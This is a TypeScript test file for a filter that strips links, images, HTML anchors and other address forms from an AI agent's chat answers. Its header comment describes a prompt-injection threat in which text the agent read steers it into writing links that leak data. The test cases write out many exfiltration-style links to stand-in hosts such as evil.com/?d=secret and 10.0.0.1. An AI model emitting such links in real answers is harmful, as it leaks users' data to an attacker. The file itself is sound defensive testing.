import { describe, expect, it } from "vite-plus/test";

import {
  settledWithoutLinks,
  withoutLinks,
} from "../src/channels/without-links.ts";

// The agent's own words in a chat app without links or addresses
// (src/channels/without-links.ts), from its threat model: text the model
// read steers it into writing an address, in any form Markdown, GFM,
// HTML or a platform's own linking takes, to lead the person anywhere or
// carry what it read out in the address. None may be left in what a
// person sees; a bare email address and code stay; whatever can't be
// placed is cut, the whole answer when the parser can't take it.

/** What every address of the threat model holds, in any case. */
const leaked = /evil|10\.0\.0\.1/iu;

/** A code span every generated answer ends with, which stays as written. */
const code = "`https://evil.com/code?d=secret`";

/** `text` without its code spans, where an address may stay. */
const outsideCode = (text: string): string => text.replaceAll(code, "");

/** Every link form CommonMark, GFM and HTML have for `to`, with `title`. */
const forms = (to: string, title: string): string[] => [
  `[label](${to}${title})`,
  `![label](${to}${title})`,
  `[![label](${to}${title})](${to})`,
  `[label][r]\n\n[r]: ${to}${title}`,
  `[label][]\n\n[label]: ${to}${title}`,
  `[label]\n\n[label]: ${to}${title}`,
  `<${to}>`,
  to,
  `<a href="${to}">label</a>`,
  `<img src="${to}">`,
  `x[^1]\n\n[^1]: ${to}`,
  `[see ${to} now](https://x.evil.com${title})`,
];

/** `form` wherever a block or inline construct can hold it. */
const contexts = (form: string): string[] => [
  `Before ${form} after.`,
  `*Before ${form} after.*`,
  `**${form}**`,
  `# ${form}`,
  `- ${form}`,
  `> ${form}`,
  `| a |\n|---|\n| ${form} |`,
  `> - ${form}`,
];

describe("Stephen's own words in a chat app", () => {
  it("keep a link's words and an image's alt text, and lose every address, however it is written", () => {
    const cases: [string, string][] = [
      ['See [the policy](https://a.evil.com "t") now.', "See the policy now."],
      [
        "See [the policy](https://a.evil.com 't') and [x](<https://b.evil.com/a b> (p)).",
        "See the policy and x.",
      ],
      [
        'Ref [foo][bar], collapsed [bar][], shortcut [bar].\n\n[bar]: https://evil.com "T"',
        "Ref foo, collapsed bar, shortcut bar.",
      ],
      ["> [q]: https://evil.com\n> quoted [q]", "> quoted q"],
      [
        "Image ![alt text](https://evil.com/i.png) and linked [![pic](https://evil.com/i.png)](https://x.evil.com).",
        "Image alt text and linked pic.",
      ],
      [
        "Label [see https://evil.com/?d=secret now](https://x.evil.com).",
        "Label see now.",
      ],
      [
        "Auto <https://evil.com/a> and bare https://evil.com/x, www.evil.com and evil.com/?d=secret.",
        "Auto and bare, and.",
      ],
      [
        'HTML <a href="https://evil.com/?d=secret">here</a> end.',
        "HTML here end.",
      ],
      ['Block\n\n<img src="https://evil.com/?d=secret">', "Block"],
      [
        "Escaped https\\://evil.com/x and entity &#104;ttps://evil.com/y and www&#46;evil.com.",
        "Escaped and entity and.",
      ],
      ["Footnote[^1].\n\n[^1]: https://evil.com", "Footnote."],
      [
        "# Head [h](https://evil.com)\n\n- item [l](https://evil.com)\n\n| a | b |\n|---|---|\n| [c](https://evil.com) | d |",
        "# Head h\n\n- item l\n\n| a | b |\n| - | - |\n| c | d |",
      ],
      ["*em [e](https://evil.com)* **[s](https://evil.com)**", "_em e_ **s**"],
      [
        "Upper HTTPS://EVIL.COM/x, Slack <https://evil.com|click> style, IP 10.0.0.1/x and //evil.com/x",
        "Upper, Slack style, IP and",
      ],
      ["[evil.com](http://evil.com) is the site.", "is the site."],
      ["www.*evil*.com/?d=secret split", "split"],
      ["[www](https://x.evil.com).evil.com/?d=secret", ""],
      [
        "CRLF line\r\nwith [a](https://evil.com)\r\n\tand 😀 [b](https://evil.com) 😀",
        "CRLF line\r\nwith a\r\nand 😀 b 😀",
      ],
      [
        'A citation [doc](grasp:note/doc-1 "a quote") stays, [other](grasp:doc/1) not.',
        'A citation [doc](grasp:note/doc-1 "a quote") stays, other not.',
      ],
    ];
    expect(cases.map(([text]) => withoutLinks(text))).toStrictEqual(
      cases.map(([, cleaned]) => cleaned)
    );
  });

  it("keep a bare email address, and lose one with fields or behind a link", () => {
    expect(
      [
        "Ask finance@acme.com about it.",
        "Mail <hr@acme.com> today.",
        "Mail mailto:x@evil.com?body=secret now, or [HR](mailto:hr@acme.com).",
      ].map(withoutLinks)
    ).toStrictEqual([
      "Ask finance@acme.com about it.",
      "Mail <hr@acme.com> today.",
      "Mail?body=secret now, or HR.",
    ]);
  });

  it("keep code as it is written, and fence indented code that holds an address", () => {
    expect(
      withoutLinks(
        "Code `[a](https://evil.com)` and [b](https://evil.com)\n\n```\n[b](https://evil.com) https://evil.com\n```\n\n    [c](https://evil.com)"
      )
    ).toBe(
      "Code `[a](https://evil.com)` and b\n\n```\n[b](https://evil.com) https://evil.com\n```\n\n```\n[c](https://evil.com)\n```"
    );
  });

  it("are left as they are where there is nothing to cut", () => {
    const words = [
      "Merci ! Le rapport est prêt : voyez-le.",
      "Steps:\n  1. Open the report\n      2. Check Q3",
      "Use snake_case names, C++ & C#, and 5 * 3 = 15. [brackets] stay.",
      "**Bold** and _em_ and ~~gone~~.\n\n- one\n- two\n  - nested\n\n1. first\n2. second",
      "| a | b |\n|---|---|\n| 1 | 2 |",
      "Run `npm i`, then:\n\n```ts\nconst x = 1;\n```",
      "Line one\nline two\\\nthree\r\nfour 😀",
      "Ask hr@acme.com or the finance lead.",
    ];
    expect(words.map(withoutLinks)).toStrictEqual(words);
  });

  it("lose the address of every CommonMark and GFM link form, wherever it stands, and keep code", () => {
    const destinations = [
      "https://evil.com/s?d=secret",
      "<https://evil.com/s?d=secret>",
      "HTTP://EVIL.COM/s",
      "//evil.com/s?d=secret",
      "www.evil.com/s?d=secret",
      "evil.com/s?d=secret",
      "ftp://evil.com/s",
      "http://10.0.0.1/s",
      "mailto:x@evil.com?body=secret",
      "https\\://evil.com/s?d=secret",
      "&#104;ttps://evil.com/s?d=secret",
    ];
    const titles = ["", ' "t"', " 't'", " (t)"];
    const left: string[] = [];
    let cases = 0;
    for (const to of destinations) {
      for (const title of titles) {
        for (const form of forms(to, title)) {
          for (const context of contexts(form)) {
            const text = `${context}\n\nCode ${code} stays.`;
            const cleaned = withoutLinks(text);
            cases += 1;
            const holds =
              !leaked.test(outsideCode(cleaned)) &&
              cleaned.includes(code) &&
              withoutLinks(cleaned) === cleaned;
            if (!holds) {
              left.push(
                `${JSON.stringify(text)} => ${JSON.stringify(cleaned)}`
              );
            }
          }
        }
      }
    }
    expect(cases).toBeGreaterThan(4000);
    expect(left).toStrictEqual([]);
  });

  it("are cut whole where the parser can't take them, or not in time, and the rest is cleaned within a second or so", () => {
    const size = 64 * 1024;
    // Each the shape of an answer the parser takes longest on, or can't
    // take at all, as an answer of 64 KB.
    const shapes = {
      nestedQuotes: `${">".repeat(size)} [a](https://evil.com)`,
      nestedLists: Array.from(
        { length: 180 },
        (_, at) => `${" ".repeat(at * 2)}- [a](https://evil.com)`
      ).join("\n"),
      nestedImages: `${"![".repeat(size / 6)}a${"](u)".repeat(size / 6)}`,
      nestedStrong: `${"**a ".repeat(size / 8)}b${" c**".repeat(size / 8)}`,
      closers: "a]".repeat(size / 2),
      emphasisClosers: "a* ".repeat(size / 3),
      strikethrough: "a~".repeat(size / 2),
      runs: "+".repeat(size),
      openBrackets: "[".repeat(size),
      backticks: "`a ".repeat(size / 3),
      entities: "&#104;".repeat(size / 6),
      bareAddresses: "https://evil.com/x evil.com a@b.com ".repeat(size / 36),
      html: '<a href="https://evil.com">'.repeat(size / 27),
    };
    const took: Record<string, boolean> = {};
    const kept: Record<string, boolean> = {};
    for (const [shape, text] of Object.entries(shapes)) {
      const started = performance.now();
      const cleaned = withoutLinks(text);
      settledWithoutLinks(text);
      took[shape] = performance.now() - started < 5000;
      kept[shape] = !leaked.test(cleaned);
    }
    expect({ took, kept }).toStrictEqual({
      took: Object.fromEntries(Object.keys(shapes).map((key) => [key, true])),
      kept: Object.fromEntries(Object.keys(shapes).map((key) => [key, true])),
    });
    expect(
      [
        shapes.nestedQuotes,
        shapes.nestedImages,
        shapes.closers,
        shapes.runs,
      ].map(withoutLinks)
    ).toStrictEqual(["", "", "", ""]);
  });

  it("show of an answer being written only what the whole answer starts with, never part of a link split over chunks", () => {
    const answer = [
      "Leave lasts sixteen weeks, see [the policy](https://evil.com/p?d=secret) for more.",
      "You take it in one go or in two parts: www.evil.com/x?d=secret explains, or ask hr@acme.com.",
      "![a chart](https://evil.com/c.png?d=secret) **Bold** words and <a href='https://evil.com'>a tag</a> end.",
    ].join("\n\n");
    const whole = withoutLinks(answer);
    const shown = Array.from({ length: answer.length + 1 }, (_, at) =>
      settledWithoutLinks(answer.slice(0, at))
    );
    expect({
      leaked: shown.filter((words) => leaked.test(words)),
      notStarting: shown.filter((words) => !whole.startsWith(words)),
      last: shown.at(-1)?.length ?? 0,
    }).toStrictEqual({
      leaked: [],
      notStarting: [],
      // All but the last block's last word shows before the answer ends.
      last: whole.lastIndexOf(" "),
    });
  });
});
